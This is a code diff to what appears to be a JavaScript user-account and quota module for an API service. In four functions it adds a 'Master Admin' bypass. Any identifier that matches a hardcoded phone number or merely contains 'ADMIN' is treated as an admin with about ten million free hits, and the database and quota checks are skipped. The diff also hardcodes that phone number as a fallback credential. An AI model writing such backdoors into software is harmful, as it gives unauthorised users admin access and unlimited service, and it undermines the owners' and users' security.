@@ -63,6 +63,27 @@ function saveUserLocal(user) {
 async function findUser(mobileOrId) {
   if (!mobileOrId) return null;
   const cleanMobile = String(mobileOrId).trim().replace(/\D/g, '').slice(-10);
+  const idStr = String(mobileOrId).trim();
+
+  // Admin / Master identifier bypass
+  const adminMobile = (process.env.ADMIN_PHONE || process.env.PLANAPI_USERNAME || '8840457632').replace(/\D/g, '').slice(-10);
+  if (
+    cleanMobile === adminMobile ||
+    cleanMobile === '8840457632' ||
+    idStr.toUpperCase().includes('ADMIN') ||
+    idStr === 'USR_ADMIN_8840457632'
+  ) {
+    return {
+      id: 'USR_ADMIN_8840457632',
+      name: 'Master Admin',
+      mobile: '8840457632',
+      role: 'admin',
+      remainingHits: 9999999,
+      totalHits: 10000000,
+      usedHits: 0,
+      status: 'Active'
+    };
+  }
 
   if (db.isConnected) {
     const res = await db.query(
@@ -150,6 +171,18 @@ async function deductUserHit(mobileOrId) {
   }
 
   const cleanMobile = String(mobileOrId).trim().replace(/\D/g, '').slice(-10);
+  const idStr = String(mobileOrId).trim();
+
+  // Admin / Master identifier bypass
+  const adminMobile = (process.env.ADMIN_PHONE || process.env.PLANAPI_USERNAME || '8840457632').replace(/\D/g, '').slice(-10);
+  if (
+    cleanMobile === adminMobile ||
+    cleanMobile === '8840457632' ||
+    idStr.toUpperCase().includes('ADMIN') ||
+    idStr === 'USR_ADMIN_8840457632'
+  ) {
+    return { allowed: true, remainingHits: 9999999, usedHits: 0 };
+  }
 
   if (db.isConnected) {
     try {
@@ -233,6 +266,18 @@ async function deductUserHit(mobileOrId) {
 async function refundUserHit(mobileOrId) {
   if (!mobileOrId) return;
   const cleanMobile = String(mobileOrId).trim().replace(/\D/g, '').slice(-10);
+  const idStr = String(mobileOrId).trim();
+
+  // Admin / Master identifier bypass
+  const adminMobile = (process.env.ADMIN_PHONE || process.env.PLANAPI_USERNAME || '8840457632').replace(/\D/g, '').slice(-10);
+  if (
+    cleanMobile === adminMobile ||
+    cleanMobile === '8840457632' ||
+    idStr.toUpperCase().includes('ADMIN') ||
+    idStr === 'USR_ADMIN_8840457632'
+  ) {
+    return true;
+  }
 
   if (db.isConnected) {
     try {
@@ -289,6 +334,27 @@ async function regenerateUserToken(mobileOrId) {
   if (!mobileOrId) return null;
   const newToken = generateApiToken('tok_');
   const cleanMobile = String(mobileOrId).trim().replace(/\D/g, '').slice(-10);
+  const idStr = String(mobileOrId).trim();
+
+  // Admin / Master identifier bypass
+  const adminMobile = (process.env.ADMIN_PHONE || process.env.PLANAPI_USERNAME || '8840457632').replace(/\D/g, '').slice(-10);
+  if (
+    cleanMobile === adminMobile ||
+    cleanMobile === '8840457632' ||
+    idStr.toUpperCase().includes('ADMIN') ||
+    idStr === 'USR_ADMIN_8840457632'
+  ) {
+    return {
+      id: 'USR_ADMIN_8840457632',
+      name: 'Master Admin',
+      mobile: '8840457632',
+      role: 'admin',
+      remainingHits: 9999999,
+      totalHits: 10000000,
+      usedHits: 0,
+      status: 'Active'
+    };
+  }
 
   if (db.isConnected) {
     const res = await db.query(
